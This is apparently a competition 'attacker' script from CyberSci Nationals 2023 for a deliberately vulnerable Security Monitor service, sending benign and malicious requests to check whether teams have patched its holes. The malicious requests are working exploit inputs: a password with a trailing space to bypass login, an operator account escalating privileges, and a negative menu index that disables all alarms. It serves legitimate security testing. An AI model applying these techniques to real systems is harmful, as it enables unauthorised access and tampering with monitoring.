#!/usr/bin/env python3
#
# CyberSci Nationals 2023
#
# Dmitriy Beryoza (0xd13a)
#
# Attacker for Security Monitor vulnerable service

import pwn  # type: ignore[import-untyped]
import traceback
import string
import random
from pathlib import Path
from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult

REQUEST_TIMEOUT = 4

USER_OPERATOR = 0
USER_ADMIN = 1
USER_MAINT = 2


class MonitorAttacker(Attacker):

    users: dict[str, str] = {}
    usernames: list[str] = []

    def load_users(self):
        with open(Path(__file__).parent / "sm-users.csv", "r") as file:
            for line in file.readlines():
                username, pwd, type = line.strip().split(",")
                self.users[username] = (pwd, int(type))
        self.usernames = list(self.users.keys())

    def __init__(self, host, port):
        super().__init__(host, port)
        self.load_users()

    def drain(self, r):
        output = r.clean(timeout=1)
        return output

    def connect(self):
        return pwn.remote(self.host, self.port, timeout=REQUEST_TIMEOUT,
                          level='critical', ssl=True)

    def good_login(self):
        r = self.connect()

        rand_user = random.choice(self.usernames)
        val = self.users[rand_user]

        print('sm - {}:{}'.format(rand_user, val[0]))
        r.sendline('{}\x0a{}\x0a1\x0a'.format(rand_user, val[0]).
                   encode('utf-8'))
        output = self.drain(r)
        r.close()
        if b'Select one of the following options' in output:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def bad_login(self):
        r = self.connect()

        rand_user = random.choice(self.usernames)
        rand_pwd = ''.join(random.choices(string.ascii_letters + string.digits,
                                          k=20))

        print('sm - {}:{}'.format(rand_user, rand_pwd))
        r.sendline('{}\x0a{} \x0a1\x0a'.format(rand_user, rand_pwd).
                   encode('utf-8'))
        output = self.drain(r)
        r.close()
        if b'Select one of the following options' in output:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def no_privesc(self):
        r = self.connect()

        while True:
            rand_user = random.choice(self.usernames)
            val = self.users[rand_user]
            if val[1] == USER_ADMIN:
                break

        print('sm - {}:{}'.format(rand_user, val[0]))
        r.sendline('{}\x0a{}\x0a3\x0a2\x0a2\x0a1\x0a'.
                   format(rand_user, val[0]).encode('utf-8'))
        output = self.drain(r)
        r.close()
        if b'2 Reactor building           - TRIGGERED' in output:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def privesc(self):
        r = self.connect()

        while True:
            rand_user = random.choice(self.usernames)
            val = self.users[rand_user]
            if val[1] == USER_OPERATOR:
                break

        print('sm - {}:{}'.format(rand_user, val[0]))
        r.sendline('{}\x0a{}\x0a3\x0a5\x0a2\x0a1\x0a'.
                   format(rand_user, val[0]).encode('utf-8'))
        output = self.drain(r)
        r.close()
        if b'5 Emergency power generators - TRIGGERED' in output:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def good_shutdown(self):
        r = self.connect()

        while True:
            rand_user = random.choice(self.usernames)
            val = self.users[rand_user]
            if val[1] == USER_MAINT:
                break

        print('sm - {}:{}'.format(rand_user, val[0]))
        r.sendline('{}\x0a{}\x0a5\x0a2\x0a1\x0a'.format(rand_user, val[0]).
                   encode('utf-8'))
        output = self.drain(r)
        r.close()
        if b'*** Disabling all alarms! ***' in output:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def bad_shutdown(self):
        r = self.connect()

        while True:
            rand_user = random.choice(self.usernames)
            val = self.users[rand_user]
            if val[1] == USER_OPERATOR:
                break
        rand_choice = random.randint(-300, -1)

        print('sm - {}:{}'.format(rand_user, val[0]))
        r.sendline('{}\x0a{}\x0a{}\x0a2\x0a1\x0a'.
                   format(rand_user, val[0], rand_choice).encode('utf-8'))
        output = self.drain(r)
        r.close()
        if b'*** Disabling all alarms! ***' in output:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def benign_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.good_login()
            elif id == 2:
                return self.no_privesc()
            elif id == 3:
                return self.good_shutdown()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))

    def malicious_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.bad_login()
            elif id == 2:
                return self.privesc()
            elif id == 3:
                return self.bad_shutdown()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))
